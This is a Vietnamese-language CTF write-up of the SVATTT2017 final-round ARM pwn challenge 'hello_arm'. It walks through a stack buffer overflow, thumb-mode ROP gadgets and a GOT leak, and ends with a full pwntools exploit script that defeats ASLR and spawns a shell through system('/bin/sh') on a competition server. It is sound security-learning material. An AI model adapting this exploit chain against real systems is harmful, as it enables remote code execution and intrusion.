---
layout: post
title: "[SVATTT2017 Final Round] [Daemon] [Pwn] hello_arm"
---

Sau khi thọt ở vòng sơ khảo với bài formatstring. Mình đã phục thù với bài daemon **noteservice** . Nhưng lại ngã với bài **hello_arm.**... .

Trong buổi thi thì BTC có cho file img arm để tạo env debug. Xui làm sao hôm đó load file đó lại không ra mạng được, không setup được gdb. Mình down src gdb về build nhưng đến cuối lại bị failed. Thế là hôm đó quỳ với bài này... 

Về nhà mình đã tự build img arm và setup peda-arm để debug.

Tham khảo bài này để build img arm (cũng của tác giả ra đề bài này :)) ) : `https://tradahacking.vn/debug-linux-kernel-v%E1%BB%9Bi-qemu-v%C3%A0-gdb-38c2cd29f616` có mấy đoạn trong đây không đúng lắm (trong TH mình) thắc mắc gì có thể hỏi mình.

peda-arm : `https://github.com/alset0326/peda-arm`

Link các challenges đã được VNSEC public : `https://docs.google.com/spreadsheets/d/e/2PACX-1vQ3hmA1FHf-a2uymoaXk8Cu8yvji_0mYI2EnPbmSzRHoiWMwPuLXj_OpaLcqEtYHYepcI3GG3rEIpEM/pubhtml?gid=0&single=true`



Check file: 

```
hello_arm.1: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=c81cfe892f89ccc0d55b9e5d4ec40048b00de0d6, stripped
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```



Quăng vào IDA thì dễ dàng thấy lỗi bof ở đây

```C
int sub_1054C()
{
  int v1; // [sp+0h] [bp+0h]

  puts("Overflow me.");
  read(0, &v1, 1024u); // <--- bof
  return puts("End");
}
```

![](https://i.imgur.com/fEKFqix.png)

ta thấy ins `SUB SP,SP, #0x80` với SP là reg stack pointer nên ta cần padding `0x84` để có thể overwrite địa chỉ trả về.

Bài này có bật ASLR trên server nên cần phải leak địa chỉ libc base trước. 

Để có thể leak được thì cần đưa địa chỉ GOT vào thanh ghi R0. Và cần một gadget dạng `pop {xxx,pc}` để đưa hàm cần gọi vào reg PC (program counter).

dùng ROPgadget để thử tìm gadget cần :

`ROPgadget --binary hello_arm`

`1051c:	e8bdb913 	pop	{r0, r1, r4, r8, fp, ip, sp, pc}` (popret)

nhưng không control được R0. 

Đến đây thì mình đã stuck. Nhưng chợt nhớ đến hint của BTC là **thumb2-mode** .

Sau khi tìm hiểu (`http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0344c/Beiiegaf.html` ) thì được biết rằng architecture **arm** có 3 loại instruction sets là : ARM, thumb và thumb2. ARM dùng instruction 32-bit, thumb dùng instruction 16-bit và thumb2 32 bit mixing giữa 2 loại này (hỗ trợ thumb trên 32-bit và ARM). 

Trong thumb2 mode thì có một quy định để biết instruction nào của mode nào (arm hay thumb) bằng cách (`https://stackoverflow.com/questions/37836861/jump-between-thumb-and-arm`  ) 

- nếu bit 0 của địa chỉ là 0 thì CPU sẽ execute dưới dạng arm code
- nếu bit 1 của địa chỉ là 1 thì CPU sẽ execute dưới dạng thumb code
- Nếu parse sai thì CPU sẽ báo lỗi 

Đây là lí do trong code mình có mấy đoạn `+1` (Qua debug mới thấy :)) )

Vì mặc định của của ROPgadget sẽ không hiện các instruction thumb nên cần phải thêm options `--thumb`

`ROPgadget --thumb --binary hello_arm`

Ở đây có 2 gadget mình cần là :

`0x000105fc : pop.w {r3, r4, r5, r6, r7, r8, sb, pc} ; lsrs r2, r6, #4 ; movs r1, r0 ; lsrs r0, r5, #4 ; movs r1, r0 ; bx lr` (popR3)

`0x000105c6 : mov r0, r3 ; pop {r7, pc}` (movR0)

Payload mình sẽ là :

- popret 
- popR3
- got read
- mov R0 ,R3 
- plt puts
- return to main

```python
	payload=""
	payload+='B'*(0x80+4) 
	payload+= p32(popret+1)
	payload+="A"*4+ p32(popr3+1)
	payload+=p32(file.got['read']) # parameter
	payload+="A"*24
	payload+=p32(movr0+1)
	payload+="AAAA"
	payload+=p32(file.symbols['puts']) # call function
	payload+="BBBB"*7
	payload+=p32(ret2main+1)
```

Sau khi leak được libc, tiếp theo chỉ cần tính các offset binsh và system để call system("/bin/sh")

script : 

```python
from pwn import *

file = ELF('hello_arm.1')
libc = ELF('./libc-2.23.so')



def main(argv):
	if len(argv)<2:
		r = remote('localhost', 31335)
	else:
		r = remote('119.81.181.254',31335)

	ret2main = 0x0001054C

	r.recvuntil('Overflow me.\n')
	
	popret = 0x1051c
	# 1051c:	e8bdb913 	pop	{r0, r1, r4, r8, fp, ip, sp, pc}
	popr3=0x000105fc
	#0x000105fc : pop.w {r3, r4, r5, r6, r7, r8, sb, pc} ; lsrs r2, r6, #4 ; movs r1, r0 ; lsrs r0, r5, #4 ; movs r1, r0 ; bx lr
	movr0=0x000105c6
	#0x000105c6 : mov r0, r3 ; pop {r7, pc}
	
	#pause()
	
	payload=""
	payload+='B'*(0x80+4) 
	payload+= p32(popret+1)
	payload+="A"*4+ p32(popr3+1)
	payload+=p32(file.got['read'])
	payload+="A"*24
	payload+=p32(movr0+1)
	payload+="AAAA"
	payload+=p32(file.symbols['puts'])
	payload+="BBBB"*7
	payload+=p32(ret2main+1)
	
	r.sendline(payload)
	r.recvuntil("End")
	print r.recvline()

	libc.address=u32(r.recv(4))-libc.symbols['read']
	syst=libc.symbols['system']
	binsh=next(libc.search('/bin/sh\x00'))

	log.info("libc base : " + hex(libc.address))
	log.info("system : " + hex(syst))
	log.info("binsh : " + hex(binsh))

	
	payload=""
	payload+='B'*(0x80+4) 
	payload+= p32(popret+1)
	payload+="A"*4+ p32(popr3+1)
	payload+=p32(binsh)
	payload+="A"*24
	payload+=p32(movr0+1)
	payload+="AAAA"
	payload+=p32(syst)
	payload+="BBBB"*7
	payload+=p32(ret2main+1)
	
	r.recvuntil('Overflow me.\n')
	r.sendline(payload)

	r.interactive()

if __name__ == '__main__':
	main(sys.argv)
```



![a](https://i.imgur.com/aW7AlOQ.png)

Bài này cũng không khó, chủ yếu phải setup được môi trường ... hi vọng lần sau sẽ không ngã với arm nữa ...

